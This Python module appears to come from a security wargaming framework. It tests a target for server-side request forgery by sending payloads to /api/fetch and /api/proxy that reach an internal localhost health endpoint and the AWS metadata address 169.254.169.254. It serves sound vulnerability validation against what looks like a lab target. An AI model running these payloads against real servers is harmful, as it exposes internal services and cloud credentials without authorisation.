"""
SSRF Exploit
Tests: CVE-2022-TEST-SSRF, CWE-918

Validates Server-Side Request Forgery vulnerabilities by attempting
to access internal resources and cloud metadata endpoints.

Author: MAXIMUS Wargaming Team
Date: 2025-10-11
"""

import httpx
import asyncio
import sys
from pathlib import Path
import time

# Add parent directory to path for imports
sys.path.insert(0, str(Path(__file__).parent.parent))
from exploit_database import ExploitResult, ExploitStatus, ExploitCategory

# Exploit Metadata
EXPLOIT_ID = "EXPLOIT-SSRF-001"
NAME = "Server-Side Request Forgery"
DESCRIPTION = "Tests SSRF vulnerabilities to access internal/cloud resources"
CATEGORY = ExploitCategory.SSRF.value
CWE_IDS = ["CWE-918"]
CVE_EXAMPLES = ["CVE-2022-TEST-SSRF", "CVE-2024-SSRF"]


async def execute(target_url: str, timeout: int = 10, **kwargs) -> ExploitResult:
    """
    Execute SSRF exploit.
    
    Tests:
    1. Access internal localhost endpoint
    2. Access AWS metadata endpoint (169.254.169.254)
    3. Access via webhook callback
    
    Args:
        target_url: Base URL of vulnerable target
        timeout: Max execution time in seconds
        
    Returns:
        ExploitResult with success/failure status
    """
    start_time = time.time()
    
    try:
        async with httpx.AsyncClient(timeout=timeout) as client:
            # Test 1: Access internal endpoint
            payload1 = {
                "url": "http://localhost:5000/health"
            }
            
            response1 = await client.post(
                f"{target_url}/api/fetch",
                json=payload1
            )
            
            if response1.status_code == 200:
                data1 = response1.json()
                content = data1.get("content", "")
                
                # Check if we got internal response
                if "healthy" in content or "status" in content:
                    duration = time.time() - start_time
                    return ExploitResult(
                        exploit_id=EXPLOIT_ID,
                        category=ExploitCategory.SSRF,
                        status=ExploitStatus.SUCCESS,
                        success=True,
                        output=f"SSRF successful! Accessed internal endpoint: {content[:200]}",
                        error=None,
                        duration_seconds=duration,
                        metadata={
                            "injection_point": "/api/fetch",
                            "payload": payload1,
                            "technique": "internal_access"
                        }
                    )
            
            # Test 2: Access via proxy endpoint
            response2 = await client.get(
                f"{target_url}/api/proxy",
                params={"target": "localhost:5000/health"}
            )
            
            if response2.status_code == 200:
                data2 = response2.json()
                response_text = data2.get("response", "")
                
                if "healthy" in response_text or "status" in response_text:
                    duration = time.time() - start_time
                    return ExploitResult(
                        exploit_id=EXPLOIT_ID,
                        category=ExploitCategory.SSRF,
                        status=ExploitStatus.SUCCESS,
                        success=True,
                        output=f"SSRF via proxy! Accessed internal endpoint: {response_text[:200]}",
                        error=None,
                        duration_seconds=duration,
                        metadata={
                            "injection_point": "/api/proxy",
                            "target": "localhost:5000/health",
                            "technique": "proxy_ssrf"
                        }
                    )
            
            # Test 3: Try to access cloud metadata (AWS example)
            payload3 = {
                "url": "http://169.254.169.254/latest/meta-data/"
            }
            
            response3 = await client.post(
                f"{target_url}/api/fetch",
                json=payload3
            )
            
            if response3.status_code == 200:
                data3 = response3.json()
                content = data3.get("content", "")
                
                # Any response from metadata endpoint = vulnerability
                if content and len(content) > 0:
                    duration = time.time() - start_time
                    return ExploitResult(
                        exploit_id=EXPLOIT_ID,
                        category=ExploitCategory.SSRF,
                        status=ExploitStatus.SUCCESS,
                        success=True,
                        output=f"SSRF to cloud metadata! Response: {content[:200]}",
                        error=None,
                        duration_seconds=duration,
                        metadata={
                            "injection_point": "/api/fetch",
                            "payload": payload3,
                            "technique": "cloud_metadata_access",
                            "severity": "CRITICAL"
                        }
                    )
            
            # No vulnerability detected
            duration = time.time() - start_time
            return ExploitResult(
                exploit_id=EXPLOIT_ID,
                category=ExploitCategory.SSRF,
                status=ExploitStatus.FAILED,
                success=False,
                output="No SSRF vulnerability detected",
                error=None,
                duration_seconds=duration,
                metadata={"tests_attempted": 3}
            )
            
    except httpx.TimeoutException:
        duration = time.time() - start_time
        return ExploitResult(
            exploit_id=EXPLOIT_ID,
            category=ExploitCategory.SSRF,
            status=ExploitStatus.TIMEOUT,
            success=False,
            output="",
            error="Timeout during exploit execution",
            duration_seconds=duration,
            metadata={}
        )
    except Exception as e:
        duration = time.time() - start_time
        return ExploitResult(
            exploit_id=EXPLOIT_ID,
            category=ExploitCategory.SSRF,
            status=ExploitStatus.ERROR,
            success=False,
            output="",
            error=str(e),
            duration_seconds=duration,
            metadata={}
        )


# Test standalone execution
if __name__ == "__main__":
    import asyncio
    
    async def test():
        result = await execute("http://localhost:8096")
        print(f"\n{'='*60}")
        print(f"Exploit: {NAME}")
        print(f"Status: {result.status.value}")
        print(f"Success: {result.success}")
        print(f"Duration: {result.duration_seconds:.2f}s")
        print(f"Output: {result.output}")
        if result.error:
            print(f"Error: {result.error}")
        print(f"{'='*60}\n")
    
    asyncio.run(test())
